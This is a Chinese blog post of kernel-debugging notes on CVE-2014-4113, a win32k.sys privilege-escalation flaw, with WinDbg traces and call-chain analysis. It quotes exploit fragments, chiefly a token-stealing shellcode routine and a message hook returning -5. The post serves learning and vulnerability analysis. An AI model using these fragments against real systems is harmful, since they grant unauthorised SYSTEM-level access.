# 【技术分享】经典内核漏洞调试笔记
|
##### 译文声明
本文是翻译文章，文章来源：安全客
译文仅供参考，具体内容表达以及含义原文为准。
****
**作者：**[ **k0pwn_ko**
****](http://bobao.360.cn/member/contribute?uid=1353169030)
**稿费：800RMB（不服你也来投稿啊！）**
**投稿方式：发送邮件至linwei#360.cn，或登陆 ** ** ** **[
**网页版**](http://bobao.360.cn/contribute/index)********** **在线投稿**
**前言**
内核漏洞对我来说一直是一个坎，记得两年前，刚刚接触二进制漏洞的时候，当时今天的主角刚刚出现，当时调试这个漏洞的时候，整个内心都是崩溃的，最近我重温了一下这个漏洞，发现随着自己学习进步，对整个内核漏洞分析的过程也变的越来越清晰，而且在这个内核漏洞的调试过程中发现了一些很有意思的调试细节，因此想把自己的这个调试笔记分享出来，希望能和大家多多交流，也能有更多的进步。
今天的主角就是CVE-2014-4113，这个win32k.sys下的内核漏洞是一个非常经典的内核漏洞，它无论在Exploit利用，内核漏洞的形成原因，可以说是教科书式的，非常适合对内核漏洞感兴趣的小伙伴入门分析。
**另一种方法定位漏洞**
内核漏洞分析是一个比较复杂的过程，其实无论对于内核态漏洞还是软件态漏洞，都需要通过对补丁，或者PoC，或者Exploit进行阅读，通过对源码的分析可以了解到很多和漏洞有关的细节，所以这次我们也要阅读一下关于CVE-2014-4113的Exp，从中获取一些信息。
    LRESULT CALLBACK ShellCode(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
    {
    PEPROCESS pCur, pSys ;
    fpLookupProcessById((HANDLE)dwCurProcessId,    &pCur);
    fpLookupProcessById((HANDLE)dwSystemProcessId, &pSys);
    #ifdef _WIN64
    *(PVOID *)((ULONG_PTR)pCur + dwTokenOffset) = *(PVOID *)((ULONG_PTR)pSys + dwTokenOffset);
    #else
    *(PVOID *)((DWORD)pCur + dwTokenOffset) = *(PVOID *)((DWORD)pSys + dwTokenOffset);
    #endif
    return  0 ;
    }
在源码分析过程中，我们关注Shellcode函数中的代码片段，可以看到Shellcode做了一件事情，就是针对32位系统和64位系统，会将当前系统的系统进程句柄psys，加上token的偏移赋值给当前用户进程的token，而这种手法也是现在Windows提权中一个非常好用的方法。
众所周知，Exploit一般不会影响软件或者系统的正常运行，而会执行Shellcode中的恶意代码，在我们没有PoC来引发软件或者系统异常的情况下，往往会通过Shellcode中的一些关键步骤的跟踪来接近漏洞的触发位置。
那么在这个过程中我们就用上面的Shellcode来跟踪这个漏洞。首先我们来说一下_EPROCESS结构体，这个结构体包含着当前进程的很多信息，这个过程我们可以通过!process
0 0的方法来得到。当然这个命令只有在内核态才能使用，我们通常通过Windbg远程调试的方法来完成。
可以看到，通过!process 0 0的方法获取到的system进程的句柄位置在0x867c6660，接下来我们来看一下我们执行的Exploit进程位置。
当前Exploit的地址是0x86116bb0，这两个地址就是_EPROCESS结构体的地址，下面我们来看一下这个结构体的内容。
可以看到，偏移+0x0c8位置存放的就是Token，而结合上面分析的Shellcode的内容，Token就是进行替换提权的关键位置。
实际上提权时，就是用0xe10007b3这个系统进程的Token，替换当前用户进程的0xe116438c这个Token，这也是下断点的一个重要依据，通过下条件断点，可以跟踪到当前进程句柄的变化情况。  
    ba w1 86116c78 ".printf "TOKEN CHANGE TO: [%08x]\n",poi(86116c78);.if(poi(86116c78)==0xe10007b3){;}.else{g;}"
跟踪到00411f88位置的时候，程序中断，也是这时候当前进程句柄被替换，同时回溯到堆栈调用情况。
当前堆栈调用展示了整个内核漏洞发生问题的过程，我们需要关注这个回溯过程，在后面的分析中需要用到，也由此我们定位了漏洞触发的关键流程，为后续的分析提供了依据。
    kd> kb
    ChildEBP RetAddr  Args to Child              
    WARNING: Frame IP not in any known module. Following frames may be wrong.
    9b5f7a24 81ff94f3 fffffffb 000001ed 014cfd14 0x1301448
    9b5f7a64 81ff95c5 fffffffb 000001ed 014cfd14 win32k!xxxSendMessageTimeout+0x1ac
    9b5f7a8c 820792fb fffffffb 000001ed 014cfd14 win32k!xxxSendMessage+0x28
    9b5f7aec 82078c1f 9b5f7b0c 00000000 014cfd14 win32k!xxxHandleMenuMessages+0x582
    9b5f7b38 8207f8f1 fdf37168 8215f580 00000000 win32k!xxxMNLoop+0x2c6
    9b5f7ba0 8207f9dc 0000001c 00000000 ffffd8f0 win32k!xxxTrackPopupMenuEx+0x5cd
    9b5f7c14 828791ea 004601b5 00000000 ffffd8f0 win32k!NtUserTrackPopupMenuEx+0xc3
在接下来的调试分析中，由于ASLR的关系，导致有些关键函数地址基址不太一样，不过不影响我们的调试。
**一些有趣的调试细节**
关于这个漏洞分析，其实网上有相当多非常详细的分析，这里我就不再做具体分析了，网上的方法多数都是通过Exploit正向分析，而通过Shellcode定位这种方法，可以用回溯的方法分析整个漏洞的形成过程，可能更加便捷，各有优劣。关于这个漏洞的分析，我不再详述，只是在调试过程中发现一些有趣的调试细节，想拿出来和大家一起分享。
首先我大概说一下这个漏洞的形成过程，在创建弹出菜单的时候会产生一个1EB的消息，因为SendMessage的异步调用，截断1EB消息，然后通过钩子销毁菜单，返回一个0xffffffb的方法，在随后的SendMessageTimeout函数中会调用这个返回值，作为函数调用，而在之前的if语句判断中没有对这个返回值进行有效的检查，当我们通过0页的分配，往0x5b地址位置存入Shellcode地址，这样就会在Ring0态执行应用层代码，导致提权。
那么在这个过程中，有一些有意思的地方，第一个是消息钩子截获1EB消息，并且返回0xfffffffb，第二个就是在SendMessageTimeout中在Ring0层执行应用层Shellcode代码的过程。
首先在调用xxxTrackPopupMenuEx的时候会销毁窗口，这个过程中会调用SendMessage，实际上，在SendMessage调用的时候，是分为同步和异步两种方式，两种方式的调用也有所不同，先看看同步，调用相对简单。
    SendMessage (同线程)
     SendMessageWorker
      UserCallWinProcCheckWow
       InternalCallWinProc
        WndProc
但是当异步调用的时候，情况就相对复杂了，而我们的提权也正是利用了异步的方法，用消息钩子来完成的，首先来看看异步调用的情况。
    SendMessage (异线程)
     SendMessageWorker
      NtUserMessageCall (user mode/kernel mode切换)
        EnterCrit
       NtUserfnINSTRINGNULL (WM_SETTEXT)
        RtlInitLargeUnicodeString
        xxxWrapSendMessage (xParam = 0)
         xxxSendMessageTimeout (fuFlags = SMTO_NORMAL, uTimeout = 0, lpdwResult = NULL)
       ⋯⋯
      xxxReceiveMessage
      xxxSendMessageToClient
         sysexit (kernel mode进入user mode)
       ⋯⋯
             UserCallWinProcCheckWow
             InternalCallWinProc
              WndProc
           XyCallbackReturn
           int 2b (user mode返回kernel mode)
这里有很关键的两处调用，一个在sysexit，在这个调用的时候，会从内核态进入用户态，也就是说在消息钩子执行的时候，通过这个调用会进入钩子的代码逻辑中，而当应用层代码逻辑执行结束后，会调用int
2b这个软中断，从用户态切换回内核态，这个过程就是通过消息钩子完成的，而正是利用这个钩子，在钩子中销毁窗口并且返回在整个提权过程中至关重要的0xfffffffb。
首先在HandleMenuMessages－>MNFindWindowFromPoint之后会进入SendMessage中处理，这个时候通过安装的钩子会截获到1EB消息。
源码中钩子的部分。
    lpPrevWndFunc = (WNDPROC)SetWindowLongA( pWndProcArgs->hwnd, 
                                             GWL_WNDPROC, 
     (LONG)NewWndProc ) ;        // LONG
    LRESULT CALLBACK NewWndProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
    {
    if(uMsg != 0x1EB)
    {
    return CallWindowProcA(lpPrevWndFunc, hWnd, uMsg, wParam, lParam) ;
    }
    EndMenu() ;
    return (DWORD)(-5) ; // DWORD 
    }
来看一下动态调试的过程，通过之前对异步SendMessage函数的调用关系可以看到异步调用会进入SendMessageTimeout函数处理，跟入这个函数通过回溯看到函数调用关系。
    kd> p
    win32k!xxxSendMessageTimeout+0x8:
    967e934f 56              push    esi
    kd> p
    win32k!xxxSendMessageTimeout+0x9:
    967e9350 57              push    edi
    kd> p
    win32k!xxxSendMessageTimeout+0xa:
    967e9351 8b7d20          mov     edi,dword ptr [ebp+20h]
    kd> kb
    ChildEBP RetAddr  Args to Child              
    a216ca1c 967e95c5 fea0e878 000001eb a216ca98 win32k!xxxSendMessageTimeout+0xa
    a216ca44 968695f6 fea0e878 000001eb a216ca98 win32k!xxxSendMessage+0x28
    a216ca90 96868e16 fde80a68 a216cafc 00000000 win32k!xxxMNFindWindowFromPoint+0x58
    a216caec 96868c1f a216cb0c 9694f580 00000000 win32k!xxxHandleMenuMessages+0x9e
随后我们单步跟踪，在SendMessageTimeout函数中找到调用SendMessageToClient函数。
    kd> p
    win32k!xxxSendMessageTimeout+0x1c9:
    967e9510 56              push    esi
    kd> p
    win32k!xxxSendMessageTimeout+0x1ca:
    967e9511 e81aaaffff      call    win32k!xxxSendMessageToClient (967e3f30)
通过IDA pro分析这个函数，在LABLE_16位置调用了一个叫sfn的函数，这个sfn的函数就是负责进入用户态的。
    LABEL_16:
        result = SfnDWORD(v17, v18, v19, (int)v20, v21, v22, v23, v24);
    int __stdcall SfnDWORD(int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8)
      v9[53].Next[12].Next = v8;
      ms_exc.registration.TryLevel = -2;
      UserSessionSwitchLeaveCrit();
      v27 = KeUserModeCallback(2, &v21, 24, &v28, &v29);
当sysexit调用后，内核态和用户态进行了切换。进入用户态，应用层就是我们的钩子内容。
    kd> p
    Breakpoint 6 hit
    001b:00f21600 55              push    ebp
实际上，这就是一个钩子之间的调用过程，也是提权漏洞利用过程中一个至关重要的环节。那么接下来，在钩子函数中，我们会利用EndMenu函数销毁窗口，并且返回0xfffffffb，这个过程在很多分析中都有了，下面我们来看看从用户态切换回内核态的过程。
首先销毁窗口后，0xfffffffb会交给eax寄存器，随后进入返回过程。
    kd> bp 00251631
    kd> g
    Breakpoint 1 hit
    001b:00251631 b8fbffffff      mov     eax,0FFFFFFFBh
    kd> kb
    ChildEBP RetAddr  Args to Child              
    WARNING: Frame IP not in any known module. Following frames may be wrong.
    014cf5b4 769dc4e7 000e0240 000001eb 014cf6e4 0x251631
    014cf5e0 769dc5e7 00251600 000e0240 000001eb user32!InternalCallWinProc+0x23
    014cf658 769d4f0e 00000000 00251600 000e0240 user32!UserCallWinProcCheckWow+0x14b
    014cf6b4 76a0f0a3 005be8b0 000001eb 014cf6e4 user32!DispatchClientMessage+0xda